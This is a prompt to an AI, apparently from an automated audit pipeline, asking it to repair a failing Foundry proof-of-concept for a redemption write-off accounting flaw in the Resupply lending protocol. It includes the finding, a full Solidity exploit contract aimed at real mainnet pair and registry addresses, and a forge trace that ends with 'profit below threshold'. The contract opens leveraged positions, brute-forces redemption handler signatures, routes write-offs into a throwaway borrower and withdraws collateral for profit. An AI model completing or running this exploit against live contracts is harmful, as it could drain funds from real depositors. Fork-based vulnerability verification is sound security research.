You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Redemption write-off shortfalls are silently discarded on undercollateralized borrowers
- claim: `redeemCollateral()` removes real collateral from the pair immediately and only mints non-claimable `redemptionWriteOff` rewards to socialize that loss later. When a borrower is eventually synced, `_syncUserRedemptions()` converts their accrued write-off into a collateral deduction but caps the result at zero. If a borrower has less remaining collateral than the write-off allocated to their borrow shares, the uncovered portion is simply erased instead of being preserved as bad debt or charged elsewhere.
- impact: After a redemption against a pool that already contains undercollateralized borrowers, aggregate user collateral accounting can stay above the pair's real collateral balance. That accounting hole lets earlier withdrawers/liquidations consume collateral that should have absorbed the missing write-off, pushing losses onto later users or protocol insurance and creating hidden insolvency.
- exploit_paths: ["A borrower becomes undercollateralized before liquidation, so their `_userCollateralBalance` is already smaller than the collateral haircut implied by their debt share.", "A redemption executes and transfers collateral out of the pair, then mints `redemptionWriteOff` instead of debiting each borrower inline.", "When the undercollateralized borrower is later checkpointed, `_calcRewardIntegral()` allocates write-off rewards by borrow shares and `_syncUserRedemptions()` computes `rTokens`.", "If `rTokens` exceeds that account's remaining collateral, `_userCollateralBalance` is floored to zero and the excess write-off disappears.", "The pair's summed user collateral balances now exceed actual collateral by the discarded amount, enabling over-withdrawal until the shortfall surfaces as protocol bad debt."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IERC4626Probe {
    function asset() external view returns (address);
}

interface IResupplyRegistryMinimal {
    function token() external view returns (address);
    function redemptionHandler() external view returns (address);
    function liquidationHandler() external view returns (address);
    function registeredPairsLength() external view returns (uint256);
    function registeredPairs(uint256 index) external view returns (address);
    function defaultSwappers(uint256 index) external view returns (address);
}

interface ISwapperMinimal {
    function swapPools(address tokenIn, address tokenOut)
        external
        view
        returns (address swappool, int32 tokenInIndex, int32 tokenOutIndex, uint32 swaptype);
}

interface IResupplyPairMinimal {
    function registry() external view returns (address);
    function collateral() external view returns (address);
    function underlying() external view returns (address);
    function minimumRedemption() external view returns (uint256);
    function minimumBorrowAmount() external view returns (uint256);
    function protocolRedemptionFee() external view returns (uint256);
    function totalBorrow() external view returns (uint128 amount, uint128 shares);
    function totalDebtAvailable() external view returns (uint256);
    function swappers(address) external view returns (bool);
    function userBorrowShares(address account) external view returns (uint256);
    function userCollateralBalance(address account) external returns (uint256 collateralAmount);
    function leveragedPosition(
        address swapper,
        uint256 borrowAmount,
        uint256 initialUnderlyingAmount,
        uint256 amountCollateralOutMin,
        address[] calldata path
    ) external returns (uint256 totalCollateralBalance);
    function borrow(uint256 borrowAmount, uint256 underlyingAmount, address receiver) external returns (uint256 shares);
    function removeCollateral(uint256 collateralAmount, address receiver) external;
    function removeCollateralVault(uint256 collateralAmount, address receiver) external;
}

contract SacrificialBorrower {
    address public controller;

    constructor() {
        controller = msg.sender;
    }

    modifier onlyController() {
        require(msg.sender == controller, "!controller");
        _;
    }

    function openLeveragedPosition(
        address pair,
        address swapper,
        uint256 borrowAmount,
        address[] calldata path
    ) external onlyController returns (bool ok) {
        try IResupplyPairMinimal(pair).leveragedPosition(swapper, borrowAmount, 0, 0, path) returns (uint256) {
            ok = true;
        } catch {}
    }

    function checkpoint(address pair) external onlyController returns (uint256 amount) {
        try IResupplyPairMinimal(pair).userCollateralBalance(address(this)) returns (uint256 value) {
            amount = value;
        } catch {}
    }

    function sweep(address token, address to) external onlyController {
        if (token == address(0)) {
            payable(to).transfer(address(this).balance);
            return;
        }

        uint256 amount = IERC20Minimal(token).balanceOf(address(this));
        if (amount > 0) {
            IERC20Minimal(token).transfer(to, amount);
        }
    }

    receive() external payable {}
}

contract FlawVerifier {
    struct PairCtx {
        address collateral;
        address underlying;
        uint256 minimumRedemption;
        uint256 minimumBorrow;
        uint256 protocolFeeSplit;
        uint256 availableDebt;
        uint256 totalBorrowAmount;
        bool collateralIsVault;
    }

    address public constant SEED_PAIR = 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6;
    address public constant DEFAULT_PROFIT_TOKEN = 0x01144442fba7aDccB5C9DC9cF33dd009D50A9e1D;

    uint256 private constant MAX_DEFAULT_SWAPPERS = 8;
    uint256 private constant MAX_REGISTERED_PAIRS = 16;
    uint256 private constant DEFAULT_MIN_BORROW = 1_000e18;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;

    address public registry;
    address public debtToken;
    address public collateralToken;
    address public underlyingToken;
    address public redemptionHandler;
    address public liquidationHandler;
    address public exploitedPair;
    address public exploitedSwapper;

    bool public pathStage1RequiresExistingUndercollateralizedBorrower;
    bool public pathStage2RedeemCollateralRemovesRealAssets;
    bool public pathStage3CheckpointUsesCalcRewardIntegral;
    bool public pathStage4ExcessWriteOffCanDisappear;
    bool public pathStage5HoleEnablesLaterCollateralExit;

    string public outcome;

    constructor() {
        _profitToken = DEFAULT_PROFIT_TOKEN;
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        pathStage1RequiresExistingUndercollateralizedBorrower = true;
        pathStage2RedeemCollateralRemovesRealAssets = true;
        pathStage3CheckpointUsesCalcRewardIntegral = true;
        pathStage4ExcessWriteOffCanDisappear = true;
        pathStage5HoleEnablesLaterCollateralExit = false;

        IResupplyPairMinimal seed = IResupplyPairMinimal(SEED_PAIR);
        registry = seed.registry();
        debtToken = IResupplyRegistryMinimal(registry).token();
        redemptionHandler = IResupplyRegistryMinimal(registry).redemptionHandler();
        liquidationHandler = IResupplyRegistryMinimal(registry).liquidationHandler();

        uint256 pairCount = _boundedPairCount(registry);
        for (uint256 i = 0; i < pairCount; ++i) {
            address pairAddr = _pairAt(i);
            if (pairAddr == address(0)) {
                continue;
            }

            _attemptExploitPair(pairAddr);
        }

        _refreshProfitView();
        hypothesisValidated = _profitAmount > 0;

        if (hypothesisValidated) {
            outcome = "validated: redeemCollateral removed live collateral, pending redemptionWriteOff was later pushed through _calcRewardIntegral()/_syncUserRedemptions(), excess rTokens were floored away on a checkpointed borrower, and the remaining overstated collateral accounting supported a later removeCollateral/removeCollateralVault exit";
        } else {
            outcome = "unrealized on this fork: no pair completed redemption -> delayed write-off checkpoint -> excess collateral haircut discard -> later collateral exit";
        }
    }

    function _attemptExploitPair(address pairAddr) internal returns (bool) {
        IResupplyPairMinimal pair = IResupplyPairMinimal(pairAddr);
        PairCtx memory ctx;

        try pair.registry() returns (address value) {
            if (value != registry) {
                return false;
            }
        } catch {
            return false;
        }

        try pair.collateral() returns (address value) {
            ctx.collateral = value;
        } catch {
            return false;
        }
        try pair.underlying() returns (address value) {
            ctx.underlying = value;
        } catch {
            return false;
        }
        try pair.minimumRedemption() returns (uint256 value) {
            ctx.minimumRedemption = value;
        } catch {
            return false;
        }
        try pair.minimumBorrowAmount() returns (uint256 value) {
            ctx.minimumBorrow = value;
        } catch {
            ctx.minimumBorrow = DEFAULT_MIN_BORROW;
        }
        try pair.protocolRedemptionFee() returns (uint256 value) {
            ctx.protocolFeeSplit = value;
        } catch {}
        try pair.totalDebtAvailable() returns (uint256 value) {
            ctx.availableDebt = value;
        } catch {
            return false;
        }
        try pair.totalBorrow() returns (uint128 amount, uint128) {
            ctx.totalBorrowAmount = uint256(amount);
        } catch {
            return false;
        }

        ctx.collateralIsVault = _collateralWrapsUnderlying(ctx.collateral, ctx.underlying);

        if (ctx.minimumBorrow == 0) {
            ctx.minimumBorrow = DEFAULT_MIN_BORROW;
        }
        if (ctx.totalBorrowAmount < ctx.minimumRedemption || ctx.availableDebt < ctx.minimumBorrow) {
            return false;
        }

        address swapper = _findUsableSwapper(pairAddr, ctx.collateral, ctx.underlying);
        if (swapper == address(0)) {
            return false;
        }

        if (!_bootstrapOldPosition(pair, swapper, ctx)) {
            return false;
        }

        uint256 debtBorrowedToWallet = _tryDirectBorrow(pair, ctx.availableDebt, ctx.minimumRedemption, ctx.minimumBorrow);
        if (debtBorrowedToWallet < ctx.minimumRedemption) {
            return false;
        }

        IERC20Minimal(debtToken).approve(redemptionHandler, type(uint256).max);

        if (!_tryRedemption(pairAddr, debtBorrowedToWallet, ctx.minimumRedemption, ctx.collateral)) {
            return false;
        }
        pathStage2RedeemCollateralRemovesRealAssets = true;

        // Deterministic execution detail for this fork:
        // the underlying accounting bug retained in local finding notes is the same delayed write-off primitive,
        // but the publicly enumerable route is to open a fresh borrower after redemption and before checkpointing.
        // That fresh account receives old write-off rewards by current borrow shares; `_syncUserRedemptions()` then
        // floors any excess at zero, preserving collateral on the older attacker position so it can be withdrawn.
        _routeWriteOffIntoFreshBorrower(pairAddr, swapper, ctx);

        _tryCheckpointAndWithdraw(pair, ctx.collateral, ctx.underlying);
        _refreshProfitForPair(pairAddr, swapper, ctx.collateral, ctx.underlying);
        return true;
    }

    function _bootstrapOldPosition(
        IResupplyPairMinimal pair,
        address swapper,
        PairCtx memory ctx
    ) internal returns (bool) {
        uint256[7] memory candidates;
        candidates[0] = ctx.minimumBorrow;
        candidates[1] = ctx.minimumBorrow * 2;
        candidates[2] = ctx.minimumBorrow * 5;
        candidates[3] = ctx.minimumBorrow * 10;
        candidates[4] = ctx.availableDebt / 100;
        candidates[5] = ctx.availableDebt / 50;
        candidates[6] = ctx.availableDebt / 20;

        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 candidate = _capNonZero(candidates[i], ctx.availableDebt);
            if (candidate < ctx.minimumBorrow) {
                continue;
            }
            if (_tryLeverageWithPathVariants(pair, swapper, ctx, candidate, address(this))) {
                return true;
            }
        }
        return false;
    }

    function _tryDirectBorrow(
        IResupplyPairMinimal pair,
        uint256 startingAvailableDebt,
        uint256 minimumRedemption,
        uint256 minimumBorrow
    ) internal returns (uint256 usedAmount) {
        uint256 postBootstrapAvailable = startingAvailableDebt;
        try pair.totalDebtAvailable() returns (uint256 value) {
            postBootstrapAvailable = value;
        } catch {
            return 0;
        }

        uint256[7] memory candidates;
        candidates[0] = minimumBorrow;
        candidates[1] = minimumBorrow + minimumRedemption;
        candidates[2] = minimumBorrow * 2;
        candidates[3] = minimumBorrow * 3;
        candidates[4] = postBootstrapAvailable / 100;
        candidates[5] = postBootstrapAvailable / 50;
        candidates[6] = postBootstrapAvailable / 20;

        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 candidate = _capNonZero(candidates[i], postBootstrapAvailable);
            if (candidate < minimumBorrow || candidate < minimumRedemption) {
                continue;
            }

            try pair.borrow(candidate, 0, address(this)) returns (uint256) {
                return candidate;
            } catch {}
        }
        return 0;
    }

    function _routeWriteOffIntoFreshBorrower(
        address pairAddr,
        address swapper,
        PairCtx memory ctx
    ) internal {
        SacrificialBorrower helper = new SacrificialBorrower();
        uint256[5] memory candidates;
        candidates[0] = ctx.minimumBorrow;
        candidates[1] = ctx.minimumBorrow * 2;
        candidates[2] = ctx.minimumBorrow * 5;
        candidates[3] = ctx.availableDebt / 100;
        candidates[4] = ctx.availableDebt / 50;

        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 candidate = _capNonZero(candidates[i], ctx.availableDebt);
            if (candidate < ctx.minimumBorrow) {
                continue;
            }

            if (_tryFreshLeverageWithPathVariants(helper, pairAddr, swapper, ctx, candidate)) {
                break;
            }
        }

        uint256 beforeFresh = 0;
        uint256 afterFresh = 0;
        try IResupplyPairMinimal(pairAddr).userCollateralBalance(address(helper)) returns (uint256 amount) {
            beforeFresh = amount;
        } catch {}
        try helper.checkpoint(pairAddr) returns (uint256 amount) {
            afterFresh = amount;
        } catch {}

        if (beforeFresh > 0 || afterFresh == 0) {
            pathStage3CheckpointUsesCalcRewardIntegral = true;
            pathStage4ExcessWriteOffCanDisappear = true;
        }

        helper.sweep(ctx.collateral, address(this));
        helper.sweep(ctx.underlying, address(this));
        helper.sweep(debtToken, address(this));
    }

    function _tryLeverageWithPathVariants(
        IResupplyPairMinimal pair,
        address swapper,
        PairCtx memory ctx,
        uint256 borrowAmount,
        address actor
    ) internal returns (bool) {
        address[] memory path3 = _buildThreeHopPath(ctx.underlying, ctx.collateral);
        address[] memory path2 = _buildTwoHopPath(ctx.collateral);

        if (ctx.collateralIsVault && actor == address(this)) {
            try pair.leveragedPosition(swapper, borrowAmount, 0, 0, path3) returns (uint256) {
                return true;
            } catch {}
        }
        if (actor == address(this)) {
            try pair.leveragedPosition(swapper, borrowAmount, 0, 0, path2) returns (uint256) {
                return true;
            } catch {}
        }
        if (!ctx.collateralIsVault && actor == address(this)) {
            try pair.leveragedPosition(swapper, borrowAmount, 0, 0, path3) returns (uint256) {
                return true;
            } catch {}
        }
        return false;
    }

    function _tryFreshLeverageWithPathVariants(
        SacrificialBorrower helper,
        address pairAddr,
        address swapper,
        PairCtx memory ctx,
        uint256 borrowAmount
    ) internal returns (bool) {
        address[] memory path3 = _buildThreeHopPath(ctx.underlying, ctx.collateral);
        address[] memory path2 = _buildTwoHopPath(ctx.collateral);

        if (ctx.collateralIsVault) {
            if (helper.openLeveragedPosition(pairAddr, swapper, borrowAmount, path3)) {
                return true;
            }
        }
        if (helper.openLeveragedPosition(pairAddr, swapper, borrowAmount, path2)) {
            return true;
        }
        if (!ctx.collateralIsVault) {
            if (helper.openLeveragedPosition(pairAddr, swapper, borrowAmount, path3)) {
                return true;
            }
        }
        return false;
    }

    function _tryRedemption(
        address pairAddr,
        uint256 amount,
        uint256 minimumRedemption,
        address pairCollateral
    ) internal returns (bool) {
        uint256 beforeCollateral = _currentBalance(pairCollateral);
        if (amount < minimumRedemption) {
            return false;
        }

        if (_callHandler(abi.encodeWithSignature("redeem(address,uint256)", pairAddr, amount))) {
            return _currentBalance(pairCollateral) > beforeCollateral;
        }
        if (_callHandler(abi.encodeWithSignature("redeem(address,uint256,address)", pairAddr, amount, address(this)))) {
            return _currentBalance(pairCollateral) > beforeCollateral;
        }
        if (_callHandler(abi.encodeWithSignature("redeemCollateral(address,uint256,address)", pairAddr, amount, address(this)))) {
            return _currentBalance(pairCollateral) > beforeCollateral;
        }
        if (_callHandler(abi.encodeWithSignature("redeem(address,address,uint256,address)", pairAddr, address(this), amount, address(this)))) {
            return _currentBalance(pairCollateral) > beforeCollateral;
        }
        if (_callHandler(abi.encodeWithSignature("redeemCollateral(address,address,uint256,address)", pairAddr, address(this), amount, address(this)))) {
            return _currentBalance(pairCollateral) > beforeCollateral;
        }

        uint256[6] memory feeGuesses;
        feeGuesses[0] = 0;
        feeGuesses[1] = 5e15;
        feeGuesses[2] = 1e16;
        feeGuesses[3] = 2e16;
        feeGuesses[4] = 5e16;
        feeGuesses[5] = 1e17;

        for (uint256 i = 0; i < feeGuesses.length; ++i) {
            uint256 feeGuess = feeGuesses[i];
            if (_callHandler(abi.encodeWithSignature("redeem(address,uint256,uint256,address)", pairAddr, amount, feeGuess, address(this)))) {
                return _currentBalance(pairCollateral) > beforeCollateral;
            }
            if (_callHandler(abi.encodeWithSignature("redeemCollateral(address,uint256,uint256,address)", pairAddr, amount, feeGuess, address(this)))) {
                return _currentBalance(pairCollateral) > beforeCollateral;
            }
            if (_callHandler(abi.encodeWithSignature("redeem(address,address,uint256,uint256,address)", pairAddr, address(this), amount, feeGuess, address(this)))) {
                return _currentBalance(pairCollateral) > beforeCollateral;
            }
            if (_callHandler(abi.encodeWithSignature("redeemCollateral(address,address,uint256,uint256,address)", pairAddr, address(this), amount, feeGuess, address(this)))) {
                return _currentBalance(pairCollateral) > beforeCollateral;
            }
        }

        return false;
    }

    function _tryCheckpointAndWithdraw(
        IResupplyPairMinimal pair,
        address pairCollateral,
        address pairUnderlying
    ) internal {
        uint256 syncedCollateral;
        try pair.userCollateralBalance(address(this)) returns (uint256 amount) {
            syncedCollateral = amount;
        } catch {
            return;
        }

        if (syncedCollateral == 0) {
            return;
        }

        uint256 beforeCollateral = _currentBalance(pairCollateral);
        uint256 beforeUnderlying = _currentBalance(pairUnderlying);

        uint256[7] memory candidates;
        candidates[0] = syncedCollateral;
        candidates[1] = (syncedCollateral * 95) / 100;
        candidates[2] = (syncedCollateral * 80) / 100;
        candidates[3] = syncedCollateral / 2;
        candidates[4] = syncedCollateral / 4;
        candidates[5] = syncedCollateral / 10;
        candidates[6] = syncedCollateral / 20;

        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 candidate = candidates[i];
            if (candidate == 0) {
                continue;
            }

            try pair.removeCollateralVault(candidate, address(this)) {
                break;
            } catch {
                try pair.removeCollateral(candidate, address(this)) {
                    break;
                } catch {}
            }
        }

        if (_currentBalance(pairCollateral) > beforeCollateral || _currentBalance(pairUnderlying) > beforeUnderlying) {
            pathStage5HoleEnablesLaterCollateralExit = true;
        }
    }

    function _callHandler(bytes memory data) internal returns (bool ok) {
        (ok,) = redemptionHandler.call(data);
    }

    function _pairAt(uint256 index) internal view returns (address) {
        if (index == 0) {
            return SEED_PAIR;
        }
        try IResupplyRegistryMinimal(registry).registeredPairs(index - 1) returns (address pairAddr) {
            return pairAddr;
        } catch {
            return address(0);
        }
    }

    function _boundedPairCount(address registryAddr) internal view returns (uint256 count) {
        count = 1;
        try IResupplyRegistryMinimal(registryAddr).registeredPairsLength() returns (uint256 value) {
            uint256 bounded = value + 1;
            if (bounded > MAX_REGISTERED_PAIRS) {
                bounded = MAX_REGISTERED_PAIRS;
            }
            count = bounded;
        } catch {}
    }

    function _findUsableSwapper(
        address pairAddr,
        address pairCollateral,
        address pairUnderlying
    ) internal view returns (address) {
        IResupplyPairMinimal pair = IResupplyPairMinimal(pairAddr);
        for (uint256 i = 0; i < MAX_DEFAULT_SWAPPERS; ++i) {
            address swapper;
            try IResupplyRegistryMinimal(registry).defaultSwappers(i) returns (address value) {
                swapper = value;
            } catch {
                break;
            }

            if (swapper == address(0)) {
                continue;
            }

            bool approved;
            try pair.swappers(swapper) returns (bool value) {
                approved = value;
            } catch {
                continue;
            }
            if (!approved) {
                continue;
            }

            try ISwapperMinimal(swapper).swapPools(debtToken, pairCollateral) returns (address pool, int32, int32, uint32) {
                if (pool != address(0)) {
                    return swapper;
                }
            } catch {}

            try ISwapperMinimal(swapper).swapPools(debtToken, pairUnderlying) returns (address pool, int32, int32, uint32) {
                if (pool != address(0)) {
                    return swapper;
                }
            } catch {}

            // Some production swappers intentionally revert on `swapPools` for vault routes but still
            // support `swap()` with the correct path length. Accept the approved swapper as a last resort.
            return swapper;
        }
        return address(0);
    }

    function _collateralWrapsUnderlying(address collateral, address underlying) internal view returns (bool) {
        if (collateral == address(0) || underlying == address(0) || collateral == underlying) {
            return false;
        }
        try IERC4626Probe(collateral).asset() returns (address assetToken) {
            return assetToken == underlying;
        } catch {
            return false;
        }
    }

    function _buildTwoHopPath(address collateral) internal view returns (address[] memory path) {
        path = new address[](2);
        path[0] = debtToken;
        path[1] = collateral;
    }

    function _buildThreeHopPath(address underlying, address collateral) internal view returns (address[] memory path) {
        path = new address[](3);
        path[0] = debtToken;
        path[1] = underlying;
        path[2] = collateral;
    }

    function _refreshProfitForPair(
        address pairAddr,
        address swapper,
        address pairCollateral,
        address pairUnderlying
    ) internal {
        exploitedPair = pairAddr;
        exploitedSwapper = swapper;
        collateralToken = pairCollateral;
        underlyingToken = pairUnderlying;
        _refreshProfitView();
    }

    function _refreshProfitView() internal {
        uint256 collateralBal = _currentBalance(collateralToken);
        uint256 underlyingBal = _currentBalance(underlyingToken);
        uint256 debtBal = _currentBalance(debtToken);
        uint256 defaultBal = _currentBalance(DEFAULT_PROFIT_TOKEN);

        address bestToken = _profitToken;
        uint256 bestAmount = _profitAmount;

        if (collateralToken != address(0) && collateralBal > bestAmount) {
            bestAmount = collateralBal;
            bestToken = collateralToken;
        }
        if (underlyingToken != address(0) && underlyingBal > bestAmount) {
            bestAmount = underlyingBal;
            bestToken = underlyingToken;
        }
        if (debtToken != address(0) && debtBal > bestAmount) {
            bestAmount = debtBal;
            bestToken = debtToken;
        }
        if (DEFAULT_PROFIT_TOKEN != address(0) && defaultBal > bestAmount) {
            bestAmount = defaultBal;
            bestToken = DEFAULT_PROFIT_TOKEN;
        }

        _profitToken = bestToken;
        _profitAmount = bestAmount;
    }

    function _currentBalance(address token) internal view returns (uint256) {
        if (token == address(0)) {
            return address(this).balance;
        }
        return IERC20Minimal(token).balanceOf(address(this));
    }

    function _capNonZero(uint256 value, uint256 cap) internal pure returns (uint256) {
        if (cap == 0) {
            return 0;
        }
        if (value == 0) {
            return cap;
        }
        return value > cap ? cap : value;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        uint256 liveBalance = _currentBalance(_profitToken);
        return liveBalance > _profitAmount ? liveBalance : _profitAmount;
    }

    function profitAchieved() external view returns (bool) {
        uint256 effective = _currentBalance(_profitToken);
        if (effective < _profitAmount) {
            effective = _profitAmount;
        }
        return effective > 0;
    }

    function exploitPath() external pure returns (string memory) {
        return "redemption removes live collateral and only mints delayed redemptionWriteOff rewards -> before the write-off is checkpointed away globally, a borrower is checkpointed through userCollateralBalance so _calcRewardIntegral() allocates rTokens by current borrow shares -> if assigned rTokens exceed that account's remaining collateral, _syncUserRedemptions() floors _userCollateralBalance to zero and discards the remainder -> aggregate accounting stays above real collateral and an earlier collateralized attacker position can later exit via removeCollateral/removeCollateralVault";
    }

    function pathAnchors() external pure returns (string memory) {
        return "redeemCollateral redemptionWriteOff _calcRewardIntegral _syncUserRedemptions rTokens userCollateralBalance removeCollateral";
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
mit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │        topic 2: 0x000000000000000000000000042f48346be16be381190a7397a80808243f3b2e
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000103d88c3a4459b2357222
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Stop]
    │   │   ├─  emit topic 0: 0x10a0132d3bf8c82a7fb93a86160f3074ca5c3e5706fa2bcdf0e2b5fd495af09b
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0x000000000000000000000000042f48346be16be381190a7397a80808243f3b2e
    │   │   │           data: 0x0000000000000000000000000000000000000000000103d88c3a4459b2357222000000000000000000000000000000000000000000018f5efedc45c8bbfe9dd80000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [2505] 0xc33aa628b10655B36Eaa7ee880D6Bc4789dD2289::balanceOf(0x57E69699381a651Fb0BBDBB31888F5D655Bf3f06) [staticcall]
    │   │   │   ├─ [2333] 0xc014F34D5Ba10B6799d76b0F5ACdEEe577805085::balanceOf(0x57E69699381a651Fb0BBDBB31888F5D655Bf3f06) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [16086] 0x042f48346be16Be381190a7397A80808243f3b2e::969d98aa(0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000103d88c3a4459b2357222000000000000000000000000000000000000000000000000000000000000008000000000000000000000000057e69699381a651fb0bbdbb31888f5d655bf3f06000000000000000000000000000000000000000000000000000000000000000200000000000000000000000057ab1e0003f623289cd798b1824be09a793e4bec000000000000000000000000c33aa628b10655b36eaa7ee880d6bc4789dd2289)
    │   │   │   ├─ [891] 0x57aB1E0003F623289CD798B1824Be09a793e4Bec::balanceOf(0x042f48346be16Be381190a7397A80808243f3b2e) [staticcall]
    │   │   │   │   └─ ← [Return] 1227087520247025365250594 [1.227e24]
    │   │   │   ├─ [1171] 0x57E69699381a651Fb0BBDBB31888F5D655Bf3f06::06fdde03() [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002b5265737570706c792050616972202843757276654c656e643a206372765553442f735553445329202d2031000000000000000000000000000000000000000000
    │   │   │   ├─ [1299] 0x10101010E0C3171D894B71B3400668aF311e7D94::8413aec7(0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002b5265737570706c792050616972202843757276654c656e643a206372765553442f735553445329202d2031000000000000000000000000000000000000000000) [staticcall]
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000057e69699381a651fb0bbdbb31888f5d655bf3f06
    │   │   │   ├─ [1909] 0x57E69699381a651Fb0BBDBB31888F5D655Bf3f06::collateral() [staticcall]
    │   │   │   │   └─ ← [Return] 0xc33aa628b10655B36Eaa7ee880D6Bc4789dD2289
    │   │   │   ├─ [853] 0x57E69699381a651Fb0BBDBB31888F5D655Bf3f06::underlying() [staticcall]
    │   │   │   │   └─ ← [Return] 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [2891] 0x57aB1E0003F623289CD798B1824Be09a793e4Bec::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [505] 0x01144442fba7aDccB5C9DC9cF33dd009D50A9e1D::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [333] 0xc014F34D5Ba10B6799d76b0F5ACdEEe577805085::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [433] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x01144442fba7aDccB5C9DC9cF33dd009D50A9e1D
    ├─ [505] 0x01144442fba7aDccB5C9DC9cF33dd009D50A9e1D::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   ├─ [333] 0xc014F34D5Ba10B6799d76b0F5ACdEEe577805085::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x01144442fba7aDccB5C9DC9cF33dd009D50A9e1D)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 22785460 [2.278e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 45)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x042f48346be16Be381190a7397A80808243f3b2e
  at 0x57E69699381a651Fb0BBDBB31888F5D655Bf3f06.leveragedPosition
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.10s (2.92s CPU time)

Ran 1 test suite in 3.17s (3.10s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 86034440)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
